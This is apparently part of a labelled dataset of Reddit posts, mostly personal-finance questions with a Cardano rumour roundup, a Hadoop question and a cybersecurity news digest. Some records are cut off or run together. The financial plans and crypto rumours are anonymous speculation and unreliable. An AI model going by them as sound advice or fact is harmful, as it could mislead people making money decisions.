I will broaden this out to green stocks in general (throw in EVs) in general, but wanted to get opinions on which of the following hypotheses could explain it:

1. Speculation Bubble: None of the green stocks have realistic valuations, and are falling back to their value. 
2. GameStop Black Hole: A lot of the growth in green stocks was from retail, which is now increasingly drawn to meme stocks instead. 
3. Interest Rates: The rise of 10 year bond interest rate is increasing the cost of loans, and eating into the expected profitability of green companies
4. Politics: As green energy becomes a partisan political issue, it is becoming a mood indicator for liberal policies in general

I am long term optimistic about green energy, particularly with [solar and wind being cost-competitive (and in most cases cheaper) than fossil fuels](https://ourworldindata.org/cheap-renewables-growth).

My little family of 3 has managed to put aside 4 months worth of expenses as an emergency fund (EF). Most of this has been possible because of windfalls of money. 

Our only ""debt"" is our daughters braces that we pay $172 a month towards, and no interest is being accrued. Looking at our expenses, there's not a ton we can trim. We don't have a lot left over at the end of the month since we are a single income family living in a HCOL area.

Our EF is currently sitting in our checking account. I have a HYSA that I intended to keep it in, but with interest rates as they are, I haven't been too worried about moving it over.

I'd really like to start setting aside money for those ""emergencies"" that aren't really emergencies, like car maintenance, house maintenance etc. The easiest way I can think of would be to pull a months (maybe 1.5 months, not sure of the exact balance) worth of expenses from EF to pay off the braces, and start budgeting that money towards those goals each month (we use YNAB, so think envelope system).

I need a little advice.

The title pretty much says it but below with more details.

I filed my 2020 taxes and they were accepted by Fed and state.

After filing I calculated my MAGI based upon AGI from tax filings and realized that I had over-contributed to my 2020 Roth IRA.

I worked out the over-contribution amount and had the over-contribution + earnings on the over-contribution re-characterized by my brokerage to my existing traditional IRA. For simplicity let's say the figure is $2000 even. $1500 from over-contribution and $500 is earnings on the $1500 contribution.

Can I now rollover the $2000 amount that was re-characterized to my traditional IRA back into my Roth IRA?

If yes, am I going to trigger a tax event? To me it seems like I already paid the taxes on this $2000 amount for 2020 when I filed. $1500 was not treated as pre-tax and the $500 I paid taxes on pretty sure through my 1099-DIV.

I don't really want the $2000 to be Traditional and I also don't want to be double-taxed.

If helpful I also already put $6000 into my 2021 Roth IRA.

I e-filed my federal return (joint married) with FreeTaxUSA on 3/27, and the IRS says it is being processed right now. 

Now, I just realized I omitted about $200 of interest earned and I still have not filed our state returns.

My state return situation is complicated. My spouse and I got married last year while living apart. FreeTaxUSA software was not as great compared to TurboTax for our state return situation and I'd much rather file my state returns using TurboTax, but unfortunately I cannot e-file using that method unless I submit a federal return with TurboTax too.

What do you think I should do? 

(1) Print my state returns using TurboTax and then file them by mailing to our state's tax office ... then maybe amend the federal return on FreeTaxUSA

(2) Update federal return and complete state returns on TurboTax then e-file all of it... (note: I already e-filed the federal return on freetaxusa... I don't know how to make the turbotax federal return an ""amended"" return on their site. If I just e-file a federal return again would the IRS know better?)

(3) Use FreeTaxUSA to e-file our state returns (even though it was not as intuitive as TurboTax and gave very different values), and also use that site to amend our federal return?

(4) put bread on my ears and wear a sign that says ""I'm an idiot sandwhich"".",finance
personalfinance,"15,000 saved so far, how should I proceed with investing and savings","Hey All, wanted to ask some opinions on how I should split my current savings and future savings going forward. Currently we have about 15,000 saved in our savings, usually can save about 1500 at least per month on top of that going forward. Currently it just sits in a chase account getting nothing out of it. Here is what my thoughts are, like to know if this is a solid plan:

1.	Currently have a 401k already through my job for retirement that was started a few years ago.
2.	Take 10,000 out of the 15,000 and put it into a affirm high yield savings account as the emergency fund. This gives us easy access to use it anytime we need it.
3.	Take 3,000 and open a general savings account with vanguard, into the vanguard 500 investment fund. Can leave this here allowing it to grow better then the affirm 1.6 interest rate, and can still take out if ever needed with no issue as well, but since it’s dependent on the stock market, make sense to not dump out emergency fund in here I would think and keep that separate on affirm
4.	take 2, 000 and start investing into stocks with robinhood. We’re new 2 stocks so a lot to learn about stocks and options etc. But this should give us a good starting option to grow this with the market.
5.	as we continue to save about 1500 a month or more, maybe throw 800$ into affirm, 400 into vanguard, and 300 into robinhood stocks. 

Does this seem like a solid plan going forward to have a emergency fund if needed, but still take chances on growing out money in different ways?",finance

cardano,Cardano Rumor Rundown APR 8 2021,"Hey Everyone!

I've been consuming all the Cardano news and media on a daily basis for years now. I figured it wouldn’t hurt to share a list of what I'm seeing for anyone else who's interested. Feel free to make additions as you see fit. Many of your additions from yesterday are in the “Newly Covered” list for today. Also let me know if you think any of the “Previously Covered but Still Interesting” items are no longer interesting and should leave the list.

Check out the youtube companion to today’s post: [https://youtu.be/SbxBSoRM064](https://youtu.be/SbxBSoRM064)

Let's go....

Newly covered today:

1. Today will be Part II of the coverage of the lates Roadmap vid from Charles. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
2. Sidechains. They call the main chain the “Cardano Settlement Layer” (CSL) and the side chains are called “Cardano Computation Layers” (CCL). They are looking at having CCLs for the EVM, IELE, Catalyst, and WASM (web assembly). They are trying to figure out how to pay for the maintenance of these side chains. A current thought is to possibly create a mechanism where you can “refine” ADA to get “fuel” for these sidechains. You could even have a Plutus side chain that runs on its own fuel. This year they will propose a Cardano Improvement Proposal (CIP) to see if the community wants to update the monetary policy in an HFC event to go in this direction. This could be a good way to include the parachain ideas from Polkadot.  They could also add Hyperledger related permissioned sidechains with this.
3. Layer Two. A lot of deal flow with Prism right now around digital identify for things like authenticated wallets, KYC/AML, regulated DeFi, and human readable addresses. Charles will probably do a full video on this. Hydra is the other piece of off-chain infrastructure for this year. IOHK has a whole team working on this. They’ve already put out two papers on this. Will put out two more papers this year and a prototype will also be on the way.  Hydra will be run by the stake pool operators.
4. “With all this, we’re going to piss all over what ETH 2.0 is trying to accomplish”. I’m paraphrasing slightly, but I almost spit out my coffee when he said this.
5. Quantum Resistance. This will be a big project involving: QR VRF, QR zero knowledge stuff, quantum signatures, and modeling of a quantum adversary. This is a huge amount of work. But this is a whole agenda that is in scope for Cardano 2025.
6. Catalyst &amp; Voltaire. Right now Catalyst is mainly about treasury but it needs to be linked to Voltaire which is all about protocol updates. This will probably mean a bicameral voting model that controls hard fork combinator events.There will be DAO as a service to provide voting rights for your users if you build a dApp or other project on Cardano. They will move from the current plutocracy to something that is hybridized between the current system and “proof of merit”. This is going to require a lot of thinking around the social science behind governance. It will be a more nuanced power dynamic.
7. Approach to the Reference Client.Right now it’s just Haskell, they will probably also build out clients in Python and Rust. Eventually they may have things like Agda, Idris, or Coq at the core. This notion of a “Core Developer” could end up being a digital identity that is authorized through voting.
8. Commercial. On the commercial side they are really going to scale things up to the eight figure level.  There’s a lot of good news coming there. Charles says he is reserving that for the Africa Special.

Previously Covered but still interesting:

1. Charles posts a pic of a taxidermy African bird called a Turacos. He follows up that post by saying ""Guys sometimes a stuffed Ethiopian exotic bird next to an old identity book is just a stuffed Ethiopian exotic bird next to an old identity book. Stop reading into things"". Everyone enjoys speculating what exactly this could mean with the obvious implication being that the African bird announcement involves digital identity in Ethiopia. [https://twitter.com/IOHK\_Charles/status/1369397063583227911](https://twitter.com/IOHK_Charles/status/1369397063583227911) [https://twitter.com/IOHK\_Charles/status/1369402020067766275](https://twitter.com/IOHK_Charles/status/1369402020067766275)
2. It's announced that 591 different assets have been minted on Cardano in the last eight days. [https://twitter.com/IOHK\_Charles/status/1369347294324162561](https://twitter.com/IOHK_Charles/status/1369347294324162561)
3. Catalyst Fund 3 Voting is ongoing, it looks like the Yoroi team has worked out the voting problem in the Yoroi wallet. [https://twitter.com/YoroiWallet/status/1369050858546200585](https://twitter.com/YoroiWallet/status/1369050858546200585)
4. Charles says they are actually going to hire investigators for the IOG anti-scammer team. People with a law enforcement or intelligence background should feel free to apply. Should have a report on the team’s first investigation soon. Hopefully, this will contribute to scammers actually actively avoiding (those alliterations tho!) Cardano. Could also be a nice basis for an intelligence apparatus and private military when we build the Cardano Citadel. I mean somebody is gonna have to man the watchtowers if we’re gonna keep out all the no-coiners and ETH people. Kidding...kidding. [https://youtu.be/6God9Xtzuqs](https://youtu.be/6God9Xtzuqs)
5. Cardano hodler Ben Askren continues preparations for his boxing match with Jake Paul. Being a Cardano hodler, it is already a foregone conclusion that Askren’s aura will cause Jake Paul to refuse to fight before the opening bell even sounds. [https://twitter.com/Benaskren/status/1286094545973846017](https://twitter.com/Benaskren/status/1286094545973846017) [https://twitter.com/Benaskren/status/1376021472993480705](https://twitter.com/Benaskren/status/1376021472993480705)
6. We hit 100% decentralization of block production tomorrow. Breath it in, friends. Taste the sweet completely decentralized air. Many crypto ecosystems will never know that feeling.

7. Today is D-Day, d=0, complete decentralization of block production as covered in preceding days. Enjoy it guys!!!
8. The Daedalus wallet now supports native tokens! [https://twitter.com/InputOutputHK/status/1376936748715020288](https://twitter.com/InputOutputHK/status/1376936748715020288)
9. Charles recently mentioned Senegal in the Julian Hosp interview. I believe that is the first time this nation state has been discussed in the context of the pan-African strategy for Cardano. [https://youtu.be/Zm6I1agqPWQ](https://youtu.be/Zm6I1agqPWQ)
10. Yesterday, there was a dev community Q&amp;A call with native token engineering lead and Plutus expert, Polina Vinogradova. Lots of good info shared there on all things fungible and non-fungible (including verification in the token registry and babel fees) in the Cardano ecosystem. To drive accuracy, only the party with the private key corresponding to the token minting will be able to make changes in the token registry as to that token.
11. In the native token call there was also a very interesting characterization of babel transactions as incomplete transactions that will include offers to exchange as a means to complete the transactions. “So, you will do two transactions or no transactions.” These incomplete transactions are called “liability transactions”. A group of them is called a “liability group”. When they get completed they are called a “closed liability group”. Babel fees are still very much in the paper writing phase. The team is currently agnostic as to how these exchange offers will be announced to stake pool operators. For more details on babel fees, we’ll have to wait for the paper.
12. Cardano Youtuber Big Pey just did two really good videos on the developing NFT scene in Cardano and how to accomplish manual escrow in discord so that you don’t get scammed trying to buy Cardano NFTs. The focus here was on the SpaceBudz series of NFTs. These kinds of manual procedures are probably the best that can be done right now. They also highlight how much easier everything will be once we get smart contracts with Alonzo since simple escrow like this is a prime use case for simple smart contracts that at the outset seem like they should be accomplishable even just in Marlowe.

14. Graph blockchain has announced an acquisition of $300k in ADA for staking purposes. Once the corporate finance world finds understands the dynamic around staking in Cardano, we may see announcements like this with dollar values that are orders of magnitude higher. Right now the corporate world is considering holding BTC on their balance sheets. But, yield on ADA holdings might become hyperattractive to a wide spectrum of companies once they understand the dynamics of staking and that a compounding yield is available for capture.

18. How hard is learning Haskell from scratch? Today’s youtube companion to this post describes my experience so far learning Haskell as a beginner with little programming experience.

19. Charles tweets a pic of a Turaco and John Hancock. It seems safe to assume this means the minister has signed or is signing the Ethiopia deal! This could finally retire rumor #1 that started the Rumor Rundown. [https://twitter.com/ArmySpies/status/1378416705282613253](https://twitter.com/ArmySpies/status/1378416705282613253)

27. Liqwid founder, Dewayne Cameron, did a great interview with Cardano with Paul. It sounds like Liqwid is currently having a team of Haskell developers build out their product in Plutus for a target launch around the same time as Alonzo. This is great news since earlier in its history it looked like Liqwid would initially build in Solidity and use the KEVM bridge. Making their product native to Plutus out of the gate seems like a great move! Dewane also had some really good info about working with IOHK and how a team of seasoned Haskell devs could walk in and probably build anything in Plutus over a not too long timeline. Also a really good discussion of how EUTXO will give their users an advantage in predictability of transaction cost over users of account-balance (e.g. ETH) based competitors.

28. Occam Association President, Mark Berger, also did an interview with Rick McCracken on Cardano Live. He provided some good detail on what Occam would like to deliver and where they currently are in their development. [https://youtu.be/vTBLIZ7voz8](https://youtu.be/vTBLIZ7voz8)
29. Tomorrow we’ll hit the items from the roadmap video that Charles just did.
30. Cardano is now being used as a traceability solution in conjunction with Scantrust for wine from the Nation State of Georgia.  This is a great use case for the Cardano blockchain!

31. The latest roadmap video from Charles covered a lot of ground. We’ll tackle it piece by piece. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
32. Ourobouros Omega.  Ourobouros Classic 2016 was a “theoretical artifact” that IOHK could build upon.  Ourobouros Praos was 2017 and it’s still running now.  Ourobouros Genesis was 2018. Ourobouros Omega is going to be the capstone. It will be a rollup of all the previous iterations plus Redux, Chronos, Ledger Combiners, and some things they’ve learned from the larger industry. The paper and a prototype will be this year. We want to be there by Cardano 2025.
33. Light Clients/Wallets (e.g. Yoroi). Great way to get a view on the blockchain through a server.  Trouble is that it’s not trustless as to the blockchain since you don’t download it. Protocols currently on the market like Mina are using recursive snarks (“zk-snark” = “Zero-Knowledge Succinct Non-Interactive Argument of Knowledge”). You can basically have a proof that proves 1) coins exist, and 2) haven’t been double spent with a goal of 22kb of data (very small amount of data). IOHK has been following Mina and “Bulletproofs” (also a type of snark). IOHK will bring out a paper and (hopefully) prototype of the Mithral Protocol this year.  It will be a similar trustless model where light wallet is the default and you can still trust the blockchain on the server is correct without downloading the chain.

bigdata,Please help me to understand how fault tolerance in HDFS Federation is Better than HDFS High Availability?,"Hi There,

I am having bit trouble to understand how come the fault tolerance in HDFS Federation(HF) is Better than HDFS High Availability(HA)?

1. HF has a number of namenodes which work independently on dedicated namespaces without sharing meta data.
2. Every online document I am referring, says HF is better than HA in terms of fault tolerance because if a namenode in HF fails, that would not affect the data taken care of by other name nodes!
3. But my concern is, if a namenode fails we are losing the entire data it is maintaining! where is the back up for this very namenode?..atleast in HA we have the secondary namenode which backs up for the primary namenode.

Please help me to understand how do they ensure no data will be lost if any namenode fails?

personalfinance,VA home loan with student loans and new job,"Greetings all,

I would like your insight into my situation. I am finishing graduate school soon and am currently interviewing for my dream job in another state. I've been researching the area and the real estate market is very good for a buyer (lots of decent homes in the $90-130k range). The rental market, however, is terrible. My spouse and I would ideally rent for a while, but I really don't think we will find a rental that will accept the number of pets we have (2 cats and 3 small dogs).

The alternative is to buy a home. We have limited savings, but honestly amost of it will probably go towards moving since we would be going most of the way across the country unless I can negotiate moving expenses with this job. My spouse is a veteran, so we are eligible for a VA loan which helps a lot. However, there are a few problems here.

1. My husband will not likely find a job prior to the move
2. I have extreme student loans (mix of federal and private). I really wish I had done things differently, but it is what it is. 
3. I will probably not actually have my degree in hand when we move, and I don't know if I can set up the income-sensitive repayment plan until the loans are no longer in ""in school"" status

So I'm wondering if anyone can give advice. Under the standard repayment plan, my loans would be about $4000 per month and no one would give me a loan with that. With an income-driven plan, they would be more like $1300 per month. My starting salary would be $60-65k. 

Even though my husband would obviously be quitting his current job for the move, would we be able to use his income for the loan as long as he was still employed when we applied? He makes about $40k, so it would obviously help with the debt to income ratio.

With the price range we're looking at, I'd estimate house payments to be $500-800 per month.

Thank you! I'm sure there might be other factors to consider, but this would be our first home and I'm not familiar with the ins and outs of home buying.",finance
personalfinance,What do you think about my cash-out refinance plan for $40k/year breathing room by next year?,"I've read many of these on here already, and I know these are frowned upon, but please hear me out.

GROSS INCOME: $180k/year  
NET PAYCHECK INCOME: $127k  (direct deposit after 401k, insurances, taxes, deductions, etc...)  
MONTHLY WORKING INCOME: $10590

\*\*\*YEARLY BONUSES, PAYCHECK/NET AMOUNT: $10k-15k, pretty consistent last decade, not factored into budget, ever.

&amp;#x200B;

HOW DID WE GET HERE?A combination of two things, I think. 1)Tripling then quadrupling our household income from 2012-2015, and we went from a small apartment to a nice big house. 2) We fell into the trap of ""have more spend more"" and pretty much upgrading our lifestyle and filling up our house. Already had 2 kids, then a new baby at some point throughout that added additional costs. Lots of travel and just stupid unbudgeted spending. We got wise in 2018, realized our mistakes (and the huge hole we were in), and made some changes like making a budget, spend less, eat out less, no flying to another city to see a band, budgeting for clothes, fun, electronics, etc...

While not an ideal situation, we are not struggling month to month. We have paid down CC from $80k 18 months ago using my yearly bonuses, and we always pay a lot more than minimum. We don't physically have the CC cards anymore (except for Lowes) and continue paying down each month, but it will take about 2-3 years of aggressive paying to finish completely. 2-3 years is a long time and Ideally, I'd like to be investing and saving more during that time.

HERE'S MY PLAN. PLEASE TELL ME IF IT'S UNREALISTIC OR STUPID. POKE HOLES IN IT. THANK YOU.

1. Cash-out refinance at 3.0 - 3.5% @ 20 years, $260k new loan, $80k cash out, New P&amp;I $1525 (current is $1235). Maybe points, depending on what things look like.
2. Immediately pay off high-interest CC debt, CC Personal Loan, and Auto Loan (\~$80k). This would leave me with an extra $2670/month. I realize auto loan is not as important due to lower APR, but the large payment and the psychological effect of having both our cars paid off and still somewhat new would be huge! 2017 and 2015, running great. Not a car guy, won't be tempted to upgrade.
3. By December 2021, with extra monthly cash I would pay off $8k student loan, Lowes CC $3k, and other Zero Interest CC Debt $7k. ($2400/month to pay off by then).
4. Begin 2022 with a $3200/month surplus from today, or $40000/year. Save aggressively, pay down remaining student loans, increase 401k contribution, contribute an extra $200 to the monthly mortgage payment.
5. Use any yearly bonuses of $10-15k (X-Mas, Performance, Spot), which are never factored into my budget, to pay down the mortgage even further. While not guaranteed, these have been pretty consistent throughout the last decade. This additional payment plus monthly (step #4) will help me pay off the new mortgage loan by 2033, 3 years earlier than my existing loan.
6. Also, I dabble in crypto with $1000 I put in 2018. Worth around $14k now, but if it takes off enough I plan to cash out, put away a portion for taxes, and use the rest to pay down debt (but it isn't actively part of my plan right now).",finance

Unfortunately, I already replied and provided the required details. The email seemed legit and it was my first time to look for jobs to apply to. Only an hour later did I feel off about his email. I wondered if it was legit so I searched his name on Google. The results were mostly legal cases and an inmate profile. Pretty sketchy so I decided to post here. The company that was listed on indeed is called the American Watch Company. The position I applied for is Office Admin Assistant. I can't seem to view the company profile in indeed anymore because the listing was removed. Am I being scammed?

personalfinance,"VantageScore 3.0 dropped, debt increased, not sure why","Hello all,

I checked my credit scores on my Capital One and Well Fargo app today and noticed that my scores decreased. Capital One specifically dropped 40+ points, that is using the VantageScore 3.0.

I ran my report through Experian and TransUnion and nothing is immediately sticking out to me. I do have a suspicion however. I just finished a loan rehabilitation on a Federal Student Loan that totals at just over $16,000. The student loan is being handled by Navient as that is who the company I did my rehabilitation through handed it off to.

I am suspecting it is this as this is the only debt I have besides my Capital One card which I have not missed a payment on and pay it off immediately when they allow. To further why I am suspecting this, TransUnion is showing the Federal Loans in my Adverse Accounts section and shows Navient in my Satisfactory Accounts section.

They are in California and do not open up until 9 AM their time and I live in Florida so twiddling my thumbs till then.

Does this make sense that this would cause the doubling in my debt being shown?

Can I get this disputed to show correctly or will this likely be shown this way till the loans are paid?

Last Edit: I am worried about this not only because of the doubling in debt that came out of no where but also because I am going for a security clearance and want all my information reported as accurately as possible.

Last Last Edit: I was able to get ahold of Navient as well. They informed me the student loans can be reported twice just depending on timing of when things are processed. So I guess I just need to check back next month and see if that is the case.",finance

personalfinance,What to do with private student loan and 401k,"Im trying to figure out whats best for me in the long run and not quite sure what to do. I am 31 years old, married , and have 1 child as of now for a little background. My wife has her own student loans but they are close to being paid off. So we are trying to figure out whats the best way for us to get out from under this student loan debt as fast but as money smart as possible.

So right now my companys 401k match is 25% for every dollar up to 6%. I currently make roughly 60k a year and have been putting in 21% of my paycheck into my 401k. My balance is somewhere around 35k\~ in my 401k.

I have 2 student loans , 1 federal and 1 private. For this i want to focus just on my private loan which was an original balance of 41k and is now 44k  at 6% interest (even after paying for past 6 years its gone up). My current payment is 328$ and after running a payoff calculator it said id pay another 30k in interest and would take another 20 years. That's just absurd to me and refuse to just let that be.

So my question would be this, do i dial back my 401k contributions and just pump the money that i don't invest into the 401k into my student loan? Or do i take the withdrawal from my 401k and take the penalty and pay off a huge chunk of it? Or do i just remain status quo and pray that i can get a better rate and refinance at some point?

stocks,What stocks are actually well priced or even undervalued right now or is the answer nothing?,"I'm looking at the market and it seems like most stocks are still heavily inflated. Tech seems to be down, however, does seems like it'll likely be a bit shaky in the near future, given interest rates, inflation, heavy market uncertainty, and actually when you zoom out on the 1-year graph, most of tech is still very high, compared to just under a year ago. The losses from many posts seem to just be from people buying at ATHs. 

On another note, non-tech stocks looks like they're more likely to go up in the near future, however have now already risen, and at all time highs, or near it. I'm looking at Starbucks, JPM, DIS, TGT, but really works for most promising non-tech stocks.    


Seems like we're basically choosing between decent, not necessarily good or bad, but just okay priced stocks that will probably be flat in the near future, and will become a long-hold, or stocks that may also be a great long-term hold, but at very ATH prices, that we should probably expect the major gains to be over, and will likely just to be buying to go up 10% end of year, unless there's something I'm overlooking, of course ""well priced"" is also subjective, so figured I'd ask and grab some opinions.",finance

I have a series 7 so I am very familiar with the financial industry. HOWEVER, I need a lot of second opinions here. 

Applying for a  100k private student loan for 5 year/7 year.
Private lender offer me to two loan options 2.4 Variable or 5.2 Fixed rate for 5/7years [Both of them includes Interest Only Payment while in school]

Things we know
1. Given the difference is whooping 3%.   Variable Rate is tied to LIBOR and Fed said not to increase rates until end of 2022 or early 2023.

2. Even if Fed starts increase 0.25% every quarter starting 2023 then it will take until 2026 to reach the fixed rates  i am offered now.

Isnt it better to just go with variable rate contrary to the advice people generally get of ""fixed rates""?

Can people help h if I missing something?

Given my current investments, I calculate it to be more or less same-same in the end to keep my money invested and make payments or to pay it off in one go and I have funds available to do so if I choose.

My question is this: does a monthly payment on a loan like this have any significant impact on my credit score? I've read that it can look bad to credit companies when you make a few bulk payments rather than a consistent monthly payment as it suggests you can't budget money responsibly. Is there any validity to this? I am hoping to buy a house in the next few years so I'm trying to boost my score in every way possible.",finance

## Ransomware 2.0 is here

The availability of ransomware-as-a-service is allowing more cybercriminals to become involved in the business, which now includes double extortion, which, according to analysis from F-Secure, has increased drastically in 2020. This has led to an increase in ransomware families, including Ragnar Locker, Doppelpaymer, Clop, Conti, and ChaCha. Key finding in the report include attackers are using Excel formulas, which cannot be blocked, to hide malicious code, Outlook, FaceBook and Office 365 were the most popular brands spoofed in phishing emails, three-quarters of domains used to host phishing pages were web hosting services, and email accounted for over half of all malware infection attempts in 2020, making it the most common method of spreading malware in ransomware attacks.

## Malware attack is preventing car inspections in eight US states

The attack, which occurred last Tuesday, March 30 on emissions testing company Applus Technologies, disconnected its IT systems, preventing vehicle inspections in eight states, including Connecticut, Georgia, Idaho, Illinois, Massachusetts, Utah, and Wisconsin. Applus Technologies cannot provide a time frame for when they will restore service as State governments require them to go through a rigorous mitigation and testing process, which may have a cascade effect with DMV inspections, which may further lead to citations for lapsed inspections.

## GitHub investigating crypto mining abuses

GitHub is actively investigating a series of attacks against its cloud infrastructure that allowed cybercriminals to implant and abuse the company’s servers for illicit crypto-mining operations. The attacks, which have been going on since the fall of 2020 abused a feature called GitHub Actions, which allows users to automatically execute tasks and workflows once a certain event happens inside one of their GitHub repositories. The attack involves forking a legitimate repository, adding malicious GitHub Actions to the original code, and then filing a Pull Request with the original repository in order to merge the code back into the original, without needing approval of the original project owner.

## Firmware malware on the rise

According to Microsoft’s March 2021 Security Signals report, over 80% of enterprises were victims of at least one firmware attack in the past two years. The survey had responses from 1,000 companies from China, Germany, Japan, the U.K. and the U.S., who reported the majority of security investments were going to security updates, vulnerability scanning and advanced threat protection solutions. The report notes that NIST’s  National Vulnerability Database has seen a five-fold increase in firmware attacks in the last four years. The report found that only 36% of businesses invest in hardware-based memory encryption, 46% are investing in hardware-based kernel protections,while 21% of decision-makers said they were not able to monitor firmware at all. ([Security Affairs](https://securityaffairs.co/wordpress/116344/hacking/firmware-attacks-microsoft-survey.html?utm_source=feedly&amp;utm_medium=rss&amp;utm_campaign=firmware-attacks-microsoft-survey))

## LinkedIn spearphishing campaign uses custom decoy job offers

A new spear-phishing campaign is targeting LinkedIn members with customized job offers in order to deliver a sophisticated backdoor trojan called “more\_eggs.” The phish generates malicious ZIP archive files that mimic the name of the victims’ job titles taken from their LinkedIn profiles. If a LinkedIn member’s job is listed as Senior Account Executive—International Freight the malicious zip file would be titled Senior Account Executive—International Freight *position*. Upon opening the fake job offer, the victim unwittingly initiates the stealthy installation of the more\_eggs trojan. With the COVID pandemic contributing to job losses, this phish takes advantage of job seekers who are desperate to find employment.

## Ransomware attacks increased by 485% in 2020 over 2019

This data comes from Bitdefender’s 2020 Consumer Threat Landscape Report. Among the highlights: Two-thirds of the ransomware attacks took place in the first two quarters of 2020. Proprietary operating systems used in IoT devices made up 96% of all detected vulnerabilities, while a 335% surge in Smart TV vulnerabilities occurred compared to 2019. In social engineering, Android was especially heavily targeted, experiencing a 32% growth, specifically in impersonating video conferencing software and COVID-related medical apps. In addition, a 189% year-on-year increase in vulnerabilities in network-attached storage (NAS) devices was observed.

## Industrial Control Systems are becoming a favorite target for threat actors

A new report from Kaspersky confirms that 33.4% of Industrial Control System (ICS) computers worldwide were hit by a cyberattack in the second half of 2020. Citing two of the more famous examples, the China-linked group RedEcho targeting the Indian power sector and an unidentified cybercriminal attempting to poison a Florida city’s water supply and treatment plant, the report states that the attacks have not just evolved but have become a “life-threatening” affair and are on an upswing, with the U.S., Canada, and Saudi Arabia experiencing the largest increases.

## Microsoft reveals last week’s two-hour Azure outage was caused by DNS DDOS

Following up on a story we brought you on Monday, Microsoft has confirmed its April 1 outage was due to an anomalous surge of DNS queries from all over the world that was targeting certain domains hosted on Azure. The outage prevented users from accessing or signing into numerous Microsoft services. Microsoft did not reveal who was responsible for the attack whose success was unusual for such a large and well-defended target as Azure, but stated, “In this incident, one specific sequence of events exposed a code defect in our DNS service that reduced the efficiency of our DNS Edge caches.”

## Slack and Discord file sharing used to spread malware

This finding comes from Cisco Talos research, finding this an increasingly common attack vector. Threat actors upload malicious files to the platforms, which are then housed in their CDN and linked for access. These links are then shared on other outside platforms, with the malware served up by Discord or Slack infrastructure. The researchers warned that using legitimate infrastructure generally trusted by other users makes social engineering attacks much easier to pull off. Talos previously identified attackers using Discord to distribute Thanatos ransomware in 2018. -also Google forms for phishing

## Lockdowns saw the rise of wine scammers

A new report by Recorded Future notes that the start of COVID-19 lockdowns saw a rise in wine-related domain registrations as people increasingly turned to virtual happy hours to keep in contact with friends and co-workers, up 2-3 times pre-pandemic levels from April 2020 and continuing through March 2021. The report found malicious domains followed a similar growth, delayed a month with a large spike in May 2020, with a total of 4,389 malicious wine-themed domains identified. Malicious wine-related domains as a percentage of all wine domains registered peaked in June 2020 at 7%.

personalfinance,Grad Student Seeking Fresh Pair of Eyes and Some Advice,"Hey guys, long time lurker, first-time poster. I’m 23 and a first-year graduate student getting a PhD in chemistry. My parent’s finances were helped immensely by following Dave Ramsey’s baby steps, so they have been mainly feeding me his advice on what I do with my funds. While I do enjoy Dave and have been using the EveryDollar app, I don’t think his advice is tailored to someone in my situation. I have read the wiki and the flowchart, but I am also interested to hear what people have to say.

2020 is my first tax year being classified as an independent, so I will be getting the three stimulus checks in addition to my tax return. I currently have three goals that I have been throwing money into: saving up for a six-month emergency fund(which I think is $6,600, given I've been constantly spending less than $1100 a month), paying off student loans, and investing in a Roth IRA for retirement. Based on my financials, what would you guys focus on? Also open to any constructive criticism on my budget, which I started using back in August.

**Accounts:**

Checking account: $3,300 (I mainly do debit card purchases because COVID)

Savings account #1: (in true EveryDollar fashion, I’ve been putting any remaining monthly monies that aren’t in funds here, which has been between $350-$450/month thanks to COVID) $2,400

Savings account #2: $1,000 (Emergency Fund)

Discover Credit Card: $3,800 limit with a score of 740, I’ve had it three years. (I mainly use this for my subscriptions, gas, and the occasional big purchase. Paid off in full every month)

**Debts:**

Student loans: $11,200 (currently in deferment as long as I’m in school. They are all Federal subsidized loans, so I’m not accruing any interest while in school, either)

**Other things:**

Tuition is paid by the school. I also get a monthly stipend of $2,100 (been budgeting for $2,000 though because during the summer I will no longer be FICA tax-exempt).

Health insurance (minus dental) is provided by my university and I am still listed on my parent’s insurance as a secondary form of insurance.

I currently have my parent’s car (2006 Nissan Altima, 110k miles, garage car its whole life, no issues) with me and we will be moving toward transferring the title over to me in august, and I will also be looking for car insurance.

My tax returns this year was \~$570 and I will be getting $3,200 from the stimulus checks. I was currently thinking of saving the $570 for car insurance, then splitting up the stimulus checks and savings account #1 for my three goals equally, but I am not sure if this is too risk-averse given my job security, the 0% interest on my loans, and the (unlikely) probability that most of my loans could be forgiven with the current administration.

**Monthly Budget:**

Rent (all utilities but electric): $731

Electric: $100

Gas: $60

Groceries: $150

Restaurants: $120

Health and hygiene products: $45

Subscriptions: $24

Date Night: $50

Buying stuff for the apartment: $30

Entertainment: $30

Misc.: $50

*Sinking Funds (gets saved month-to-month)*

Oil changes/inspection: put in $20/pay, currently at $200

Clothing: put in $25/pay, currently at $250

Car insurance (new): $85/pay, currently at $85

Student loan: $150/pay, currently at $1,500

Roth IRA: $150/pay, currently at $1500 (not currently being invested, might make this its own post once I get advice on my stimulus checks)

Haircuts/colors: $15/pay, currently at $150

Christmas/Birthday gifts: $30/pay currently at $105

Vacations: $25/pay, currently at $250

Video Game Stuff: 10/pay, currently at $100

datascience,Eastern University - MS in Data Science | My review,"So I'm currently enrolled in [Eastern University's online MS in Data Science](https://www.eastern.edu/academics/graduate-programs/ms-data-science). I haven't finished the degree yet, but I'm far enough into it that I can give an honest assessment for those interested in enrolling.

# First, the good stuff:

* Eastern University puts their students first. The professors, administrators, and admissions staff at EU have it together when it comes to solving problems and interacting with students. They usually respond to my emails within an hour and give helpful feedback.
* EU is *super* military-friendly. I'm using the Post-9/11 GI Bill to fund my studies. If you have 100% GI Bill, then you get a degree for free and pocket *at least* $15k in stipends. Even if you only have 60% GI Bill like I do, you'll still net around $6k. At Eastern, you only need to take *one class* at a time to qualify as a full-time student, so you can collect that $894/month stipend while only enrolled in a single class. They also offer a $30 per credit discount for veterans and active duty personnel. If you're using tuition assistance while serving, the *whole program* will only cost you $500 out of pocket, which is an *insanely* good deal for a graduate degree.
* Everything is self-directed. No weekly modules. If you burn the midnight oil, you can finish an entire seven-week course in just a week or two! That's quite convenient if you're a full-time working professional with an unpredictable schedule.
* The professor's videos give a clear description on how to use programming languages. I enrolled with *zero* programming experience, but they hold your hand through the whole thing and explain in detail how it all works at a theoretical level. I usually have the instructional videos open in one window and my Python editor open in another so I can pause and play around with it. It's an effective way to learn.

# And, there are a few drawbacks:

